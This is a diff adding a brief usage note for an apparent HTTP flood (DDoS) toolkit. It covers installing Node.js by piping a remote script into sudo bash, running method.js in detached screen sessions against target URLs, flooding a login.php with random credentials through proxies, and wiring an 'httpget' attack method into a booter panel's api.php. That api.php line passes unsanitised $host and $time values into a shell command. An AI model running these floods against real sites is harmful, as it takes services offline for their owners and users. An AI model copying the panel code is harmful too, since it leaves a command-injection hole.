@@ -1,0 +1,19 @@
+Ubuntu 20.04/18.04
+sudo apt update
+curl -sL https://deb.nodesource.com/setup_14.x | sudo bash -
+sudo apt -y install nodejs
+node  -v
+v14.0.0
+npm i sync-request
+
+test working how use: node --experimental-worker method.js https://xx.ru/ 500 request GET false false false false
+
+screen -dmS mdr node method.js https://xx.ru/  500 request GET false false false false
+extra ./cthulhu we.of 443 5000 / post 500 nil
+POST DATA:
+use on login.php 
+node method.js https://exitus.xyz 300 request Checkedproxy.txt GET username=%RAND%@~@password=%RAND% false
+
+In File api.php to add this method 
+
+if ($method == "httpget") { $command = "cd floodprivate && screen -md timeout $time screen -md node method.js $host $time request GET false false false false"; }
